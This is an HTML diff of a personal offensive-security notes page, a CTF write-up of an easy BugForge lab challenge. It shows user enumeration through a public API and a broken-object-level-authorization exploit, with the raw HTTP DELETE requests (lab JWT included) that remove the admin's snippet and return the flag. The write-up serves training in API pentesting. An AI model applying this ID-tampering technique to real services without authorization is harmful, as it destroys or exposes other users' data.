@@ -24,7 +24,7 @@
     
     
       
-        <title>tanuki - b4sh0xf offsec notes</title>
+        <title>copypasta (14/01/26) - b4sh0xf offsec notes</title>
       
     
     
@@ -77,6 +77,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#copypasta-daily-challenge" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -108,7 +113,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              tanuki
+              copypasta (14/01/26)
             
           </span>
         </div>
@@ -2947,17 +2952,77 @@
       <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
       
       
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    copypasta (14/01/26)
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
       
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
-    tanuki
+    copypasta (14/01/26)
     
   </span>
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#0x00-intro" class="md-nav__link">
+    <span class="md-ellipsis">
+      0x00: intro
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x01-defining-our-main-target-admin" class="md-nav__link">
+    <span class="md-ellipsis">
+      0x01: defining our main target (admin)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x02-show-me-the-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      0x02: show me the flag!
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -3444,6 +3509,43 @@
   
   
   
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#0x00-intro" class="md-nav__link">
+    <span class="md-ellipsis">
+      0x00: intro
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x01-defining-our-main-target-admin" class="md-nav__link">
+    <span class="md-ellipsis">
+      0x01: defining our main target (admin)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x02-show-me-the-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      0x02: show me the flag!
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
   
 </nav>
                   </div>
@@ -3462,9 +3564,74 @@
   
 
 
-  <h1>tanuki</h1>
+<h1 id="copypasta-daily-challenge">copypasta (daily challenge)</h1>
+<blockquote>
+<p><strong>difficulty:</strong> <code>easy</code></p>
+<p><strong>xp earned:</strong> <code>10</code></p>
+<p><strong>categories:</strong> api pentesting</p>
+<p><strong>vulns:</strong> broken object level authorization</p>
+</blockquote>
+<h2 id="0x00-intro">0x00: intro</h2>
+<ul>
+<li>at first, we can login or register into the application, so, let's create our user
+    <img alt="register" src="../image.png" /></li>
+<li>all actions on the application are controlled via api endpoints. when we register our user, the api returns a jwt and the role of this user, in this case, just <code>user</code>. we can try mass assignment, but will dont work.
+    <img alt="meeting the api" src="../image-1.png" /></li>
+<li>ok, lets interact with the app and see your features. basically, we can create, edit and delete code snippets, make them public our private, see and comment at other users snipetts. in addition of common features like change username or password and delete our account.</li>
+<li>before we continue, let's enumerate the users (via <code>/api/snippets/public</code> response)
+    <div class="highlight"><pre><span></span><code><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="nt">&quot;user_id&quot;</span><span class="p">:</span><span class="s2">&quot;2&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="s2">&quot;coder123&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="nt">&quot;user_id&quot;</span><span class="p">:</span><span class="s2">&quot;3&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="s2">&quot;pythonista&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="nt">&quot;user_id&quot;</span><span class="p">:</span><span class="s2">&quot;4&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="s2">&quot;webdev&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="nt">&quot;user_id&quot;</span><span class="p">:</span><span class="s2">&quot;1&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="s2">&quot;admin&quot;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">]</span>
+</code></pre></div></li>
+<li>obs: in this endpoint, we can see that each snippet had an id. admin's snippet id is <code>7</code></li>
+</ul>
+<h2 id="0x01-defining-our-main-target-admin">0x01: defining our main target (admin)</h2>
+<ul>
+<li>with all this information, the first thing that i thinked to do was try to interact directly with admin stuff, like access private notes, but this isn't possible, because we can only see public snippets, all togheter. to individual snippets, we can only view the comments. we can see user's information by reading <code>/api/profile/admin</code>, but there's nothing interesting.</li>
+</ul>
+<h2 id="0x02-show-me-the-flag">0x02: show me the flag!</h2>
+<ul>
+<li>ok, after try some stuff and fail, i decided to delete an snippet that i've created. looking at the request, i see something interesting:
+    <div class="highlight"><pre><span></span><code>DELETE /api/snippets/8 HTTP/2
+Host: lab-1768408858372-l4lvaq.labs-app.bugforge.io
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJnaHUiLCJpYXQiOjE3Njg0MDg5OTd9.vnfeokWaRBPNZU3jIYPJ5QsGMxQqsMcY0emBcbQkMhg
+</code></pre></div></li>
+<li>ok, and if i decided to pass, for example, the id <code>7</code>, i will delete the admin snippet?
+    <div class="highlight"><pre><span></span><code>DELETE /api/snippets/7 HTTP/2
+Host: lab-1768408858372-l4lvaq.labs-app.bugforge.io
 
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJnaHUiLCJpYXQiOjE3Njg0MDg5OTd9.vnfeokWaRBPNZU3jIYPJ5QsGMxQqsMcY0emBcbQkMhg
 
+HTTP/2 200 OK
+Access-Control-Allow-Origin: *
+Content-Type: application/json; charset=utf-8
+Date: Wed, 14 Jan 2026 17:01:20 GMT
+Etag: W/&quot;59-Ov4i5DTuJ+cAK1dfP4qM8uULCK0&quot;
+X-Powered-By: Express
+Content-Length: 89
+
+{
+    &quot;message&quot;:&quot;Snippet deleted successfully&quot;,
+    &quot;flag&quot;:&quot;bug{xxxxxTk5sycy9Xca}&quot;
+}
+</code></pre></div></li>
+<li>gotcha! ;)</li>
+</ul>
 
 
 
